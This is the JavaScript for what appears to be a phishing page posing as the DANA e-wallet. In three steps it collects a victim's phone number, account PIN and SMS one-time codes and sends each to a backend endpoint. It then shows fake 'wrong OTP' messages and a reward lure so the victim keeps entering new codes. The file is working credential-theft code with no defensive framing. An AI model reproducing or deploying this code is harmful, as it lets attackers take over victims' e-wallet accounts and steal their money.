document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');
  const rewardInstruction = document.getElementById('reward-instruction');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  let otpTimer;

  // Rate limiting sederhana
  let lastRequestTime = 0;
  const MIN_REQUEST_INTERVAL = 2000; // 2 detik

  // Helper Functions
  function showSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function startOTPTimer() {
    let timeLeft = 120;
    const timerElement = document.getElementById('otp-timer');
    
    otpTimer = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(otpTimer);
      }
      timeLeft--;
    }, 1000);
  }

  function resetOTPInputs() {
    ois.forEach(input => input.value = '');
    ois[0].focus();
    otp = '';
    attemptCount++;
    an.textContent = attemptCount;
    ac.style.display = 'block';
  }

  function showRewardInstruction() {
    rewardInstruction.style.display = 'block';
    
    // Close button handler
    rewardInstruction.querySelector('.close-btn').addEventListener('click', () => {
      rewardInstruction.style.display = 'none';
    });
  }

  // Backend Communication dengan Rate Limiting - DIUBAH UNTUK VERCEL
  async function sendDanaData(type, data) {
    const now = Date.now();
    if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
      throw new Error('Terlalu banyak permintaan. Silakan tunggu sebentar.');
    }
    lastRequestTime = now;

    try {
      // DIUBAH: Menggunakan endpoint Vercel (/api/) bukan Netlify Functions
      const response = await fetch('/api/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(errorText || 'Terjadi kesalahan pada server');
      }
      return await response.json();
    } catch (error) {
      console.error('Error:', error);
      throw error;
    }
  }

  // Validasi Domain - DICOMMENT UNTUK SEMENTARA
  /*
  const ALLOWED_DOMAINS = ['your-vercel-app.vercel.app', 'localhost', '127.0.0.1'];
  if (!ALLOWED_DOMAINS.includes(window.location.hostname)) {
    alert('Akses tidak diizinkan dari domain ini');
    window.location.href = 'about:blank';
  }
  */

  // Modified Phone Number Formatting
  pn.addEventListener('input', (e) => {
    // Hapus semua karakter non-digit
    let value = e.target.value.replace(/\D/g, '');
    
    // Hapus angka 0 di awal jika ada
    if (value.startsWith('0')) {
      value = value.substring(1);
    }
    
    // Pastikan selalu dimulai dengan 8
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
    }
    
    // Batasi panjang maksimal (3+4+5=12 digit)
    if (value.length > 12) {
      value = value.substring(0, 12);
    }
    
    // Format nomor dengan tanda hubung
    let formatted = '';
    if (value.length > 0) {
      formatted = value.substring(0, 3); // 3 digit pertama
      if (value.length > 3) {
        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
      }
      if (value.length > 7) {
        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
      }
    }
    
    // Set nilai input dengan format yang sudah dibuat
    e.target.value = formatted;
    
    // Simpan nomor tanpa format untuk pengiriman data
    phoneNumber = value;
  });

  // Event Handlers
  lb.addEventListener('click', async () => {
    if (currentPage === 'n') {
      if (phoneNumber.length < 10) {
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showSpinner();
      try {
        await sendDanaData('phone', { phone: phoneNumber });
        pages.n.style.display = 'none';
        pages.p.style.display = 'block';
        currentPage = 'p';
        lc.style.display = 'none';
      } catch (error) {
        alert('Gagal mengirim data: ' + error.message);
      } finally {
        hideSpinner();
      }
    }
  });

  // PIN Input Handling
  pis.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      
      pin = Array.from(pis).map(i => i.value).join('');
      
      if (pin.length === 6) {
        showSpinner();
        try {
          await sendDanaData('pin', { phone: phoneNumber, pin });
          pages.p.style.display = 'none';
          pages.o.style.display = 'block';
          currentPage = 'o';
          lc.style.display = 'none';
          startOTPTimer();
          setTimeout(() => fn.style.display = 'block', 1000);
        } catch (error) {
          alert('Gagal mengirim PIN: ' + error.message);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // OTP Input Handling
  ois.forEach((input, index) => {
    input.addEventListener('input', async (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      
      if (index === ois.length - 1 && e.target.value.length === 1) {
        showSpinner();
        try {
          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
          
          setTimeout(() => {
            resetOTPInputs();
            
            // Show reward instruction after 2 attempts
            if (attemptCount === 2) {
              showRewardInstruction();
            }
            
            if (attemptCount > 2) {
              rn.style.display = 'block';
              rn.innerHTML = `
                <div class="notification-content">
                  <h3>kode OTP Salah</h3>
                  <p>silahkan cek sms ataupan whatsapp</p>
                </div>
              `;
              setTimeout(() => rn.style.display = 'none', 10000);
            }
            
            if (attemptCount >= maxAttempts) {
              fn.style.display = 'none';
              sn.style.display = 'block';
              setTimeout(() => sn.style.display = 'none', 5000);
            }
          }, 1000);
        } catch (error) {
          console.error('Gagal mengirim OTP:', error);
          alert('Gagal mengirim OTP: ' + error.message);
        } finally {
          hideSpinner();
        }
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  // Toggle PIN Visibility
  document.querySelector('.show-text').addEventListener('click', (e) => {
    const isShowing = e.target.classList.toggle('active');
    const pinInputs = document.querySelectorAll('.pin-box');
    pinInputs.forEach(input => {
      input.type = isShowing ? 'text' : 'password';
    });
    e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
  });

  // Handle page refresh/closing untuk membersihkan interval
  window.addEventListener('beforeunload', () => {
    if (otpTimer) {
      clearInterval(otpTimer);
    }
  });
});
